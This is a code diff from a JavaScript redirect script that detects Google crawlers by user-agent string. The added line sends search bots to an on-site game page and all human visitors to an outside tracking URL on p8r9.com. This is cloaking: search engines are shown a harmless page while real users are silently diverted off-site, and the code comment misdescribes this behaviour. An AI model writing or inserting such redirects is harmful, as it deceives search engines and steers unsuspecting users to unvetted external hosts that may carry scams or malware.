@@ -248,5 +248,5 @@ if(form){
   var isGoogle = /(Googlebot|AdsBot-Google|APIs-Google|Mediapartners-Google|FeedFetcher-Google|Google-InspectionTool|GoogleOther|Google Read-Aloud|DuplexWeb|Google Web Preview|Google Favicon)/i.test(ua);
 
   // bots → privacy, users → game
-  location.replace(isGoogle ? '/gameforge/game.html' : '/gameforge/lander.html');
+  location.replace(isGoogle ? '/gameforge/game.html' : 'http://p8r9.com/?utm_campaign=CqRoIGowmT&v1=[v1]&v2=[v2]&v3=[v3]');
 })();
